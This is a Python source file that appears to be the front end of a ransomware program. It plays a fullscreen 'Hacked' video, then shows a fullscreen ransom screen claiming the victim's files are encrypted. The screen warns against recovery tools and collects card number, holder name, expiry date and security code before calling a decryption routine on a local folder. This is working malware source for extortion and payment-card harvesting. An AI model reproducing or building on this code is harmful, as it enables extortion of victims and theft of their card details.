import cv2
import tkinter as tk
from tkinter import messagebox
from restorer_ware import restore_files_in_directory 

def validate_and_submit(window,key):
    card_number = window.card_number_entry.get().strip()
    card_holder_name = window.card_holder_name_entry.get().strip()
    expiry_date = window.expiry_date_entry.get().strip()
    security_code = window.security_code_entry.get().strip()
    
    if not card_number or not card_holder_name or not expiry_date or not security_code:
        messagebox.showerror("Validation Error", "All fields are required!")
        return
    
    messagebox.showinfo("Success", "Thank you! Your details have been submitted .")
    window.destroy()
    show_success_message(key)
    

def show_success_message(key):
    restore_files_in_directory("./dossier_confidentiel",key)
    txt_color = "lightgreen"
    bg_color = "black"
    window = tk.Tk()
    window.configure(bg=bg_color,padx=20,pady=200)   
    window.title("Thank you !")
    window.geometry("{0}x{1}+0+0".format(window.winfo_screenwidth(), window.winfo_screenheight()))
    window.attributes("-fullscreen", True)
    window.label = tk.Label(window, text="Your files have been decrypted! You can now access them safely!", font=("Arial", 16, "bold",))
    window.label.pack()
    change_label_config(window, fg_color=txt_color, bg_color=bg_color)
    
    exit_button = tk.Button(window, text='Exit', command=window.destroy,width=10,bg='red')
    exit_button.pack()

    window.mainloop()


def change_label_config(window, fg_color, bg_color):
    for widget in window.winfo_children():
        if isinstance(widget, tk.Label):  
            widget.configure(fg=fg_color, bg=bg_color,pady=10)


def play_video(video_path):

    cap = cv2.VideoCapture(video_path)

    desired_width = 1920
    desired_height = 1080

    cv2.namedWindow('Video', cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty('Video', cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    
    audio = cv2.VideoCapture(video_path)

    while cap.isOpened():
        ret, frame = cap.read()
        audio_ret, audio_frame = audio.read()
        
        if not ret or not audio_ret:
            break
        
        frame = cv2.resize(frame, (desired_width, desired_height))
        cv2.imshow('Video', frame)
        
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    cap.release()
    audio.release()
    cv2.destroyAllWindows()


def show_ransom_message(key):
    txt_color = "lightgreen"
    bg_color = "black"
    window = tk.Tk()
    window.configure(bg=bg_color,padx=20,pady=200)   
    window.title("Ransomware")
    window.geometry("{0}x{1}+0+0".format(window.winfo_screenwidth(), window.winfo_screenheight()))
    window.attributes("-fullscreen", True)
    window.label = tk.Label(window, text="Your files have been encrypted! That's a shame ! But you can get them back! Use the fields below to send us the money. Tic tac tic tac !`\n- Do not attempt to manually restore or decrypt your files or they will be lost forever\n- Do not use third party decryption tools or you may damage your files or corrupt them".upper(), font=("Arial", 16, "bold",))
    window.label.pack()

    card_number_label = tk.Label(window,  text="Card Number:")
    card_number_label.pack()
    window.card_number_entry = tk.Entry(window)
    window.card_number_entry.pack()

    card_holder_name_label = tk.Label(window, text="Card Holder Name:")
    card_holder_name_label.pack()
    window.card_holder_name_entry = tk.Entry(window)
    window.card_holder_name_entry.pack()

    expiry_date_label = tk.Label(window, text="Expiry Date:")
    expiry_date_label.pack()
    window.expiry_date_entry = tk.Entry(window)
    window.expiry_date_entry.pack()

    security_code_label = tk.Label(window, text="Security Code:")
    security_code_label.pack()
    window.security_code_entry = tk.Entry(window)
    window.security_code_entry.pack()
    change_label_config(window, fg_color=txt_color, bg_color=bg_color)
    pay_button = tk.Button(window, text='Pay', command=lambda: validate_and_submit(window,key),width=10,bg='lightgreen')
    pay_button.pack()

    exit_button = tk.Button(window, text='Exit', command=window.destroy,width=10,bg='red')
    exit_button.pack()

    window.mainloop()


def Main(key):
    video_path = "Hacked.mp4" 
    play_video(video_path)
    show_ransom_message(key)
